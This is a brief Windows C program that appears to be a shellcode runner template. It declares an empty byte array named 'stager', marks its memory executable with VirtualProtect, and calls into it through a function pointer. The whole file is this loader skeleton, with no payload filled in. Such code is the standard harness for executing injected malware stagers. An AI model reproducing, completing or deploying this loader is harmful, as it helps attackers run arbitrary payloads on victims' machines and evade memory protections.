
```
#include <windows.h>

char stager[] = {};

int main()
{
	DWORD oldProtect;

	VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
	int (*Egg)() = (int(*)())(void*)stager;
	Egg();
}
```
